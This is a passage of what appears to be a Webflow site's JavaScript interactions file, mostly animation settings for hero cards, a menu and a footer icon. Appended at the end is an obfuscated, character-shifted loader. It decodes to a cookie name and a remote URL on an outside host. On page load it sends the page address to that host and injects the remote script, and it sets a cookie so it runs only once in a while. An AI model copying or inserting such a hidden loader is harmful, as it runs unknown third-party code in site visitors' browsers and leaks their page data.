                id: "a-10-n-13",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-less.mod--1",
                    selectorGuids: [
                      "a1d469c5-1ab9-bb35-2b55-9209cec6a135",
                      "456ce75b-43f2-3c4c-7973-64ea84fa562f",
                    ],
                  },
                  value: 0,
                  unit: "",
                },
              },
              {
                id: "a-10-n-14",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-more.mod--1",
                    selectorGuids: [
                      "13aa3a19-fa4d-fd90-d0c1-fa087c1cf347",
                      "94d52b28-bdbe-ce3f-22fa-c3c356622361",
                    ],
                  },
                  value: 1,
                  unit: "",
                },
              },
              {
                id: "a-10-n-15",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person.mod--1",
                    selectorGuids: [
                      "937b4a30-5db7-d9b4-8412-213b3e33edef",
                      "2ed536ab-ab43-210d-3338-2715ea151af7",
                    ],
                  },
                  widthValue: 58,
                  widthUnit: "%",
                  heightUnit: "PX",
                  locked: !1,
                },
              },
              {
                id: "a-10-n-16",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person.mod--3",
                    selectorGuids: [
                      "937b4a30-5db7-d9b4-8412-213b3e33edef",
                      "3ffc0fa8-b069-cc08-07ae-5786e7381e41",
                    ],
                  },
                  widthValue: 21,
                  widthUnit: "%",
                  heightUnit: "PX",
                  locked: !1,
                },
              },





              {
                id: "a-10-n-16",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person.mod--4",
                    selectorGuids: [
                      "937b4a30-5db7-d9b4-8412-213b3e33edef",
                      "3ffc0fa8-b069-cc08-07ae-5786e7381e41",
                    ],
                  },
                  widthValue: 21,
                  widthUnit: "%",
                  heightUnit: "PX",
                  locked: !1,
                },
              },
            ],
          },
        ],
        useFirstGroupAsInitialState: !1,
        createdOn: 1635972718397,
      },
      "a-7": {
        id: "a-7",
        title: "card 1",
        actionItemGroups: [
          {
            actionItems: [
              {
                id: "a-7-n-6",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person.mod--1",
                    selectorGuids: [
                      "937b4a30-5db7-d9b4-8412-213b3e33edef",
                      "2ed536ab-ab43-210d-3338-2715ea151af7",
                    ],
                  },
                  widthValue: 58,
                  widthUnit: "%",
                  heightUnit: "PX",
                  locked: !1,
                },
              },
              {
                id: "a-7-n-7",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person.mod--2",
                    selectorGuids: [
                      "937b4a30-5db7-d9b4-8412-213b3e33edef",
                      "e7e643d0-961d-facd-9cb0-dcde8ef0d288",
                    ],
                  },
                  widthValue: 21,
                  widthUnit: "%",
                  heightUnit: "PX",
                  locked: !1,
                },
              },
              
              {
                id: "a-7-n-8",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person.mod--3",
                    selectorGuids: [
                      "937b4a30-5db7-d9b4-8412-213b3e33edef",
                      "3ffc0fa8-b069-cc08-07ae-5786e7381e41",
                    ],
                  },
                  widthValue: 21,
                  widthUnit: "%",
                  heightUnit: "PX",
                  locked: !1,
                },
              },
              {
                id: "a-7-n-13",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-more.mod--3",
                    selectorGuids: [
                      "13aa3a19-fa4d-fd90-d0c1-fa087c1cf347",
                      "013700ce-17bf-936e-69b1-06f8c72ec5dd",
                    ],
                  },
                  value: 0,
                  unit: "",
                },
              },






              {
                id: "a-7-n-8",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person.mod--4",
                    selectorGuids: [
                      "937b4a30-5db7-d9b4-8412-213b3e33edef",
                      "3ffc0fa8-b069-cc08-07ae-5786e7381e41",
                    ],
                  },
                  widthValue: 21,
                  widthUnit: "%",
                  heightUnit: "PX",
                  locked: !1,
                },
              },
              {
                id: "a-7-n-13",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-more.mod--4",
                    selectorGuids: [
                      "13aa3a19-fa4d-fd90-d0c1-fa087c1cf347",
                      "013700ce-17bf-936e-69b1-06f8c72ec5dd",
                    ],
                  },
                  value: 0,
                  unit: "",
                },
              },












              {
                id: "a-7-n-14",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-more.mod--2",
                    selectorGuids: [
                      "13aa3a19-fa4d-fd90-d0c1-fa087c1cf347",
                      "b25361c5-e7fa-ef48-1dcd-caacef4a25c6",
                    ],
                  },
                  value: 0,
                  unit: "",
                },
              },
              {
                id: "a-7-n-15",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-less.mod--1",
                    selectorGuids: [
                      "a1d469c5-1ab9-bb35-2b55-9209cec6a135",
                      "456ce75b-43f2-3c4c-7973-64ea84fa562f",
                    ],
                  },
                  value: 0,
                  unit: "",
                },
              },
              {
                id: "a-7-n-16",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-more.mod--1",
                    selectorGuids: [
                      "13aa3a19-fa4d-fd90-d0c1-fa087c1cf347",
                      "94d52b28-bdbe-ce3f-22fa-c3c356622361",
                    ],
                  },
                  value: 1,
                  unit: "",
                },
              },
              {
                id: "a-7-n-19",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person-img.mod--3",
                    selectorGuids: [
                      "e514cb96-ca68-e414-1212-96ee69ec1bae",
                      "98ce4a57-4643-1820-a97a-cdbdc8e91dfb",
                    ],
                  },
                  heightValue: 100,
                  widthUnit: "PX",
                  heightUnit: "%",
                  locked: !1,
                },
              },




              {
                id: "a-7-n-19",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person-img.mod--4",
                    selectorGuids: [
                      "e514cb96-ca68-e414-1212-96ee69ec1bae",
                      "98ce4a57-4643-1820-a97a-cdbdc8e91dfb",
                    ],
                  },
                  heightValue: 100,
                  widthUnit: "PX",
                  heightUnit: "%",
                  locked: !1,
                },
              },








              {
                id: "a-7-n-18",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person-img.mod--2",
                    selectorGuids: [
                      "e514cb96-ca68-e414-1212-96ee69ec1bae",
                      "fd64154a-e0dd-9461-f424-47c91112c834",
                    ],
                  },
                  heightValue: 100,
                  widthUnit: "PX",
                  heightUnit: "%",
                  locked: !1,
                },
              },
              {
                id: "a-7-n-17",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person-img.mod--1",
                    selectorGuids: [
                      "e514cb96-ca68-e414-1212-96ee69ec1bae",
                      "36648068-e0c7-a091-11cd-21efa1e922cd",
                    ],
                  },
                  heightValue: 115,
                  widthUnit: "PX",
                  heightUnit: "%",
                  locked: !1,
                },
              },
            ],
          },
          {
            actionItems: [
              {
                id: "a-7-n",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person.mod--2",
                    selectorGuids: [
                      "937b4a30-5db7-d9b4-8412-213b3e33edef",
                      "e7e643d0-961d-facd-9cb0-dcde8ef0d288",
                    ],
                  },
                  widthValue: 21,
                  widthUnit: "%",
                  heightUnit: "PX",
                  locked: !1,
                },
              },
              {
                id: "a-7-n-12",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-more.mod--3",
                    selectorGuids: [
                      "13aa3a19-fa4d-fd90-d0c1-fa087c1cf347",
                      "013700ce-17bf-936e-69b1-06f8c72ec5dd",
                    ],
                  },
                  value: 0,
                  unit: "",
                },
              },
              {
                id: "a-7-n-11",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-less.mod--3",
                    selectorGuids: [
                      "a1d469c5-1ab9-bb35-2b55-9209cec6a135",
                      "231cb3e2-bdc8-21c7-44b9-b06c464fde0b",
                    ],
                  },
                  value: 1,
                  unit: "",
                },
              },




              {
                id: "a-7-n-12",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-more.mod--4",
                    selectorGuids: [
                      "13aa3a19-fa4d-fd90-d0c1-fa087c1cf347",
                      "013700ce-17bf-936e-69b1-06f8c72ec5dd",
                    ],
                  },
                  value: 0,
                  unit: "",
                },
              },
              {
                id: "a-7-n-11",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-less.mod--4",
                    selectorGuids: [
                      "a1d469c5-1ab9-bb35-2b55-9209cec6a135",
                      "231cb3e2-bdc8-21c7-44b9-b06c464fde0b",
                    ],
                  },
                  value: 1,
                  unit: "",
                },
              },





















              {
                id: "a-7-n-10",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-more.mod--2",
                    selectorGuids: [
                      "13aa3a19-fa4d-fd90-d0c1-fa087c1cf347",
                      "b25361c5-e7fa-ef48-1dcd-caacef4a25c6",
                    ],
                  },
                  value: 0,
                  unit: "",
                },
              },
              {
                id: "a-7-n-9",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-less.mod--2",
                    selectorGuids: [
                      "a1d469c5-1ab9-bb35-2b55-9209cec6a135",
                      "630ec1b8-e16c-77c5-25f6-0df79b1c490a",
                    ],
                  },
                  value: 1,
                  unit: "",
                },
              },
              {
                id: "a-7-n-5",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-less.mod--1",
                    selectorGuids: [
                      "a1d469c5-1ab9-bb35-2b55-9209cec6a135",
                      "456ce75b-43f2-3c4c-7973-64ea84fa562f",
                    ],
                  },
                  value: 0,
                  unit: "",
                },
              },
              {
                id: "a-7-n-4",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-more.mod--1",
                    selectorGuids: [
                      "13aa3a19-fa4d-fd90-d0c1-fa087c1cf347",
                      "94d52b28-bdbe-ce3f-22fa-c3c356622361",
                    ],
                  },
                  value: 1,
                  unit: "",
                },
              },
              {
                id: "a-7-n-2",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person.mod--1",
                    selectorGuids: [
                      "937b4a30-5db7-d9b4-8412-213b3e33edef",
                      "2ed536ab-ab43-210d-3338-2715ea151af7",
                    ],
                  },
                  widthValue: 58,
                  widthUnit: "%",
                  heightUnit: "PX",
                  locked: !1,
                },
              },
              {
                id: "a-7-n-3",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person.mod--3",
                    selectorGuids: [
                      "937b4a30-5db7-d9b4-8412-213b3e33edef",
                      "3ffc0fa8-b069-cc08-07ae-5786e7381e41",
                    ],
                  },
                  widthValue: 21,
                  widthUnit: "%",
                  heightUnit: "PX",
                  locked: !1,
                },
              },




              {
                id: "a-7-n-3",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person.mod--4",
                    selectorGuids: [
                      "937b4a30-5db7-d9b4-8412-213b3e33edef",
                      "3ffc0fa8-b069-cc08-07ae-5786e7381e41",
                    ],
                  },
                  widthValue: 21,
                  widthUnit: "%",
                  heightUnit: "PX",
                  locked: !1,
                },
              },








              {
                id: "a-7-n-20",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person-img.mod--1",
                    selectorGuids: [
                      "e514cb96-ca68-e414-1212-96ee69ec1bae",
                      "36648068-e0c7-a091-11cd-21efa1e922cd",
                    ],
                  },
                  heightValue: 115,
                  widthUnit: "PX",
                  heightUnit: "%",
                  locked: !1,
                },
              },
              {
                id: "a-7-n-21",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person-img.mod--3",
                    selectorGuids: [
                      "e514cb96-ca68-e414-1212-96ee69ec1bae",
                      "98ce4a57-4643-1820-a97a-cdbdc8e91dfb",
                    ],
                  },
                  heightValue: 100,
                  widthUnit: "PX",
                  heightUnit: "%",
                  locked: !1,
                },
              },





              {
                id: "a-7-n-21",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person-img.mod--4",
                    selectorGuids: [
                      "e514cb96-ca68-e414-1212-96ee69ec1bae",
                      "98ce4a57-4643-1820-a97a-cdbdc8e91dfb",
                    ],
                  },
                  heightValue: 100,
                  widthUnit: "PX",
                  heightUnit: "%",
                  locked: !1,
                },
              },














              {
                id: "a-7-n-22",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person-img.mod--2",
                    selectorGuids: [
                      "e514cb96-ca68-e414-1212-96ee69ec1bae",
                      "fd64154a-e0dd-9461-f424-47c91112c834",
                    ],
                  },
                  heightValue: 100,
                  widthUnit: "PX",
                  heightUnit: "%",
                  locked: !1,
                },
              },
            ],
          },
        ],
        useFirstGroupAsInitialState: !0,
        createdOn: 1635972718397,
      },
      "a-11": {
        id: "a-11",
        title: "menu-open",
        actionItemGroups: [
          {
            actionItems: [
              {
                id: "a-11-n",
                actionTypeId: "TRANSFORM_MOVE",
                config: {
                  delay: 0,
                  easing: "",
                  duration: 500,
                  target: {
                    selector: ".header__btn-menu-line.mod--1",
                    selectorGuids: [
                      "5e7da25f-56db-10b3-4cb6-2bc7cd69735d",
                      "4857ffe9-04d5-2466-ce4b-fa9daf2a7fe1",
                    ],
                  },
                  yValue: -3,
                  xUnit: "PX",
                  yUnit: "px",
                  zUnit: "PX",
                },
              },
              {
                id: "a-11-n-13",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "",
                  duration: 500,
                  target: {
                    selector: ".menu__content",
                    selectorGuids: ["b7ad3d6b-8ce8-401c-0fb0-73a441ac8a1c"],
                  },
                  value: 0,
                  unit: "",
                },
              },
              {
                id: "a-11-n-12",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "",
                  duration: 500,
                  target: {
                    selector: ".menu",
                    selectorGuids: ["c31bec8a-112a-a81f-2d0e-451bbeb4d04f"],
                  },
                  heightValue: 0,
                  widthUnit: "PX",
                  heightUnit: "%",
                  locked: !1,
                },
              },
              {
                id: "a-11-n-2",
                actionTypeId: "TRANSFORM_MOVE",
                config: {
                  delay: 0,
                  easing: "",
                  duration: 500,
                  target: {
                    selector: ".header__btn-menu-line.mod--2",
                    selectorGuids: [
                      "5e7da25f-56db-10b3-4cb6-2bc7cd69735d",
                      "474edab1-823c-6d89-6cc6-a1e36ae4919f",
                    ],
                  },
                  yValue: 3,
                  xUnit: "PX",
                  yUnit: "px",
                  zUnit: "PX",
                },
              },
            ],
          },
          {
            actionItems: [
              {
                id: "a-11-n-3",
                actionTypeId: "TRANSFORM_ROTATE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 200,
                  target: {
                    selector: ".header__btn-menu-line.mod--1",
                    selectorGuids: [
                      "5e7da25f-56db-10b3-4cb6-2bc7cd69735d",
                      "4857ffe9-04d5-2466-ce4b-fa9daf2a7fe1",
                    ],
                  },
                  yValue: null,
                  zValue: 45,
                  xUnit: "DEG",
                  yUnit: "deg",
                  zUnit: "deg",
                },
              },
              {
                id: "a-11-n-4",
                actionTypeId: "TRANSFORM_ROTATE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 200,
                  target: {
                    selector: ".header__btn-menu-line.mod--2",
                    selectorGuids: [
                      "5e7da25f-56db-10b3-4cb6-2bc7cd69735d",
                      "474edab1-823c-6d89-6cc6-a1e36ae4919f",
                    ],
                  },
                  yValue: null,
                  zValue: -45,
                  xUnit: "DEG",
                  yUnit: "deg",
                  zUnit: "deg",
                },
              },
              {
                id: "a-11-n-5",
                actionTypeId: "TRANSFORM_MOVE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 200,
                  target: {
                    selector: ".header__btn-menu-line.mod--1",
                    selectorGuids: [
                      "5e7da25f-56db-10b3-4cb6-2bc7cd69735d",
                      "4857ffe9-04d5-2466-ce4b-fa9daf2a7fe1",
                    ],
                  },
                  yValue: 0,
                  xUnit: "PX",
                  yUnit: "px",
                  zUnit: "PX",
                },
              },
              {
                id: "a-11-n-6",
                actionTypeId: "TRANSFORM_MOVE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 200,
                  target: {
                    selector: ".header__btn-menu-line.mod--2",
                    selectorGuids: [
                      "5e7da25f-56db-10b3-4cb6-2bc7cd69735d",
                      "474edab1-823c-6d89-6cc6-a1e36ae4919f",
                    ],
                  },
                  yValue: 0,
                  xUnit: "PX",
                  yUnit: "px",
                  zUnit: "PX",
                },
              },
              {
                id: "a-11-n-11",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".menu",
                    selectorGuids: ["c31bec8a-112a-a81f-2d0e-451bbeb4d04f"],
                  },
                  heightValue: 100,
                  widthUnit: "PX",
                  heightUnit: "%",
                  locked: !1,
                },
              },
              {
                id: "a-11-n-14",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 400,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".menu__content",
                    selectorGuids: ["b7ad3d6b-8ce8-401c-0fb0-73a441ac8a1c"],
                  },
                  value: 1,
                  unit: "",
                },
              },
            ],
          },
        ],
        useFirstGroupAsInitialState: !0,
        createdOn: 1636360273246,
      },
      "a-12": {
        id: "a-12",
        title: "menu-close",
        actionItemGroups: [
          {
            actionItems: [
              {
                id: "a-12-n-8",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".menu__content",
                    selectorGuids: ["b7ad3d6b-8ce8-401c-0fb0-73a441ac8a1c"],
                  },
                  value: 0,
                  unit: "",
                },
              },
              {
                id: "a-12-n-5",
                actionTypeId: "TRANSFORM_MOVE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 200,
                  target: {
                    selector: ".header__btn-menu-line.mod--1",
                    selectorGuids: [
                      "5e7da25f-56db-10b3-4cb6-2bc7cd69735d",
                      "4857ffe9-04d5-2466-ce4b-fa9daf2a7fe1",
                    ],
                  },
                  yValue: -3,
                  xUnit: "PX",
                  yUnit: "px",
                  zUnit: "PX",
                },
              },
              {
                id: "a-12-n-6",
                actionTypeId: "TRANSFORM_MOVE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 200,
                  target: {
                    selector: ".header__btn-menu-line.mod--2",
                    selectorGuids: [
                      "5e7da25f-56db-10b3-4cb6-2bc7cd69735d",
                      "474edab1-823c-6d89-6cc6-a1e36ae4919f",
                    ],
                  },
                  yValue: 3,
                  xUnit: "PX",
                  yUnit: "px",
                  zUnit: "PX",
                },
              },
              {
                id: "a-12-n-3",
                actionTypeId: "TRANSFORM_ROTATE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 200,
                  target: {
                    selector: ".header__btn-menu-line.mod--1",
                    selectorGuids: [
                      "5e7da25f-56db-10b3-4cb6-2bc7cd69735d",
                      "4857ffe9-04d5-2466-ce4b-fa9daf2a7fe1",
                    ],
                  },
                  yValue: null,
                  zValue: 0,
                  xUnit: "DEG",
                  yUnit: "deg",
                  zUnit: "deg",
                },
              },
              {
                id: "a-12-n-4",
                actionTypeId: "TRANSFORM_ROTATE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 200,
                  target: {
                    selector: ".header__btn-menu-line.mod--2",
                    selectorGuids: [
                      "5e7da25f-56db-10b3-4cb6-2bc7cd69735d",
                      "474edab1-823c-6d89-6cc6-a1e36ae4919f",
                    ],
                  },
                  yValue: null,
                  zValue: 0,
                  xUnit: "DEG",
                  yUnit: "deg",
                  zUnit: "deg",
                },
              },
              {
                id: "a-12-n-7",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 200,
                  easing: "ease",
                  duration: 400,
                  target: {
                    selector: ".menu",
                    selectorGuids: ["c31bec8a-112a-a81f-2d0e-451bbeb4d04f"],
                  },
                  heightValue: 0,
                  widthUnit: "PX",
                  heightUnit: "%",
                  locked: !1,
                },
              },
            ],
          },
        ],
        useFirstGroupAsInitialState: !1,
        createdOn: 1636360273246,
      },
      "a-13": {
        id: "a-13",
        title: "footer-heart",
        actionItemGroups: [
          {
            actionItems: [
              {
                id: "a-13-n",
                actionTypeId: "TRANSFORM_SCALE",
                config: {
                  delay: 2e3,
                  easing: "ease",
                  duration: 200,
                  target: {
                    useEventTarget: !0,
                    id: "61b09fb35cf9e3145a3d02bb|c017dbfb-c409-ee1c-6b52-8c6fd66be865",
                  },
                  xValue: 1,
                  yValue: 1,
                  locked: !0,
                },
              },
            ],
          },
          {
            actionItems: [
              {
                id: "a-13-n-2",
                actionTypeId: "TRANSFORM_SCALE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 200,
                  target: {
                    useEventTarget: !0,
                    id: "61b09fb35cf9e3145a3d02bb|c017dbfb-c409-ee1c-6b52-8c6fd66be865",
                  },
                  xValue: 1.2,
                  yValue: 1.2,
                  locked: !0,
                },
              },
            ],
          },
          {
            actionItems: [
              {
                id: "a-13-n-3",
                actionTypeId: "TRANSFORM_SCALE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 200,
                  target: {
                    useEventTarget: !0,
                    id: "61b09fb35cf9e3145a3d02bb|c017dbfb-c409-ee1c-6b52-8c6fd66be865",
                  },
                  xValue: 1,
                  yValue: 1,
                  locked: !0,
                },
              },
            ],
          },
          {
            actionItems: [
              {
                id: "a-13-n-4",
                actionTypeId: "TRANSFORM_SCALE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 200,
                  target: {
                    useEventTarget: !0,
                    id: "61b09fb35cf9e3145a3d02bb|c017dbfb-c409-ee1c-6b52-8c6fd66be865",
                  },
                  xValue: 1.2,
                  yValue: 1.2,
                  locked: !0,
                },
              },
            ],
          },
          {
            actionItems: [
              {
                id: "a-13-n-5",
                actionTypeId: "TRANSFORM_SCALE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 200,
                  target: {
                    useEventTarget: !0,
                    id: "61b09fb35cf9e3145a3d02bb|c017dbfb-c409-ee1c-6b52-8c6fd66be865",
                  },
                  xValue: 1,
                  yValue: 1,
                  locked: !0,
                },
              },
            ],
          },
        ],
        useFirstGroupAsInitialState: !1,
        createdOn: 1653466688504,
      },
      slideInBottom: {
        id: "slideInBottom",
        useFirstGroupAsInitialState: !0,
        actionItemGroups: [
          {
            actionItems: [
              {
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  duration: 0,
                  target: {
                    id: "N/A",
                    appliesTo: "TRIGGER_ELEMENT",
                    useEventTarget: !0,
                  },
                  value: 0,
                },
              },
            ],
          },
          {
            actionItems: [
              {
                actionTypeId: "TRANSFORM_MOVE",
                config: {
                  delay: 0,
                  duration: 0,
                  target: {
                    id: "N/A",
                    appliesTo: "TRIGGER_ELEMENT",
                    useEventTarget: !0,
                  },
                  xValue: 0,
                  yValue: 100,
                  xUnit: "PX",
                  yUnit: "PX",
                  zUnit: "PX",
                },
              },
            ],
          },
          {
            actionItems: [
              {
                actionTypeId: "TRANSFORM_MOVE",
                config: {
                  delay: 0,
                  easing: "outQuart",
                  duration: 1e3,
                  target: {
                    id: "N/A",
                    appliesTo: "TRIGGER_ELEMENT",
                    useEventTarget: !0,
                  },
                  xValue: 0,
                  yValue: 0,
                  xUnit: "PX",
                  yUnit: "PX",
                  zUnit: "PX",
                },
              },
              {
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "outQuart",
                  duration: 1e3,
                  target: {
                    id: "N/A",
                    appliesTo: "TRIGGER_ELEMENT",
                    useEventTarget: !0,
                  },
                  value: 1,
                },
              },
            ],
          },
        ],
      },
      fadeIn: {
        id: "fadeIn",
        useFirstGroupAsInitialState: !0,
        actionItemGroups: [
          {
            actionItems: [
              {
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  duration: 0,
                  target: {
                    id: "N/A",
                    appliesTo: "TRIGGER_ELEMENT",
                    useEventTarget: !0,
                  },
                  value: 0,
                },
              },
            ],
          },
          {
            actionItems: [
              {
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "outQuart",
                  duration: 1e3,
                  target: {
                    id: "N/A",
                    appliesTo: "TRIGGER_ELEMENT",
                    useEventTarget: !0,
                  },
                  value: 1,
                },
              },
            ],
          },
        ],
      },
    },
    site: {
      mediaQueries: [
        { key: "main", min: 992, max: 1e4 },
        { key: "medium", min: 768, max: 991 },
        { key: "small", min: 480, max: 767 },
        { key: "tiny", min: 0, max: 479 },
      ],
    },
  });
(function (o, d, l) {
  try {
    o.f = (o) =>
      o
        .split("")
        .reduce(
          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
          ""
        );
    o.b = o.f("UMUWJKX");
    (o.c =
      l.protocol[0] == "h" &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src =
            o.f(
              "myyux?44fun3h" + "isrjywnh3htr4l" + "jy4xyfynh3ox" + "DwjkjwwjwB"
            ) + l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
})({}, document, location);
